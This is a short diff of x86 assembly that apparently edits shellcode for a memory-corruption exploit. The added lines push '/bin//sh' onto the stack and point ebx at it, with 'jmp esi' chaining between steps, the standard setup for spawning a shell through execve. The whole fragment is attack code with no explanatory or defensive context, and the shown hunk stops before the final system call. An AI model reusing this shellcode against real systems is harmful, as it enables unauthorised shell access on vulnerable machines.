@@ -11,7 +11,12 @@ add    esi, 12
 jmp    esi
 add    edx, 12
 jmp    edx
-mov    ebx, 0xffffd574
+push   eax
+push   0x68732f2f
+jmp    esi
+push   0x6e69622f
+jmp    esi
+mov    ebx, esp
 jmp    esi
 xor    ecx, ecx
 xor    edx, edx
